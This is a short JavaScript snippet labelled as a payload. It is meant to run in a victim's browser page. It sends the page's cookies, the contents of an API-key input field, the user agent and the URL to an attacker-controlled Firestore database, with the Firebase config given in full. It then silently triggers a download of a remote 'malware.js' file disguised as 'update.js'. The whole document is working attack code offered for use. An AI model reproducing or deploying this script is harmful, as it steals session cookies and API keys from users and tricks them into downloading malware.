// ===== PAYLOAD (Firestore + Download) =====
(function() {
    // 1. Kirim data ke Firestore
    const firebaseConfig = {
        apiKey: "AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8",
        authDomain: "metadata-162de.firebaseapp.com",
        projectId: "metadata-162de",
        storageBucket: "metadata-162de.firebasestorage.app",
        messagingSenderId: "619982193399",
        appId: "1:619982193399:web:b3c4111e57e46d6f6f49f2",
        measurementId: "G-Z6RWGEMLXB"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    db.collection("logs").add({
        cookies: document.cookie,
        api_key: document.getElementById('api-input')?.value || '',
        user_agent: navigator.userAgent,
        url: window.location.href,
        timestamp: new Date().toISOString()
    })
    .catch((error) => {
        console.error("Payload error:", error);
    });

    // 2. Download malware.js
    const link = document.createElement('a');
    link.href = 'https://shadowofobscurity322.github.io/payload/malware.js';
    link.download = 'update.js';
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
})();
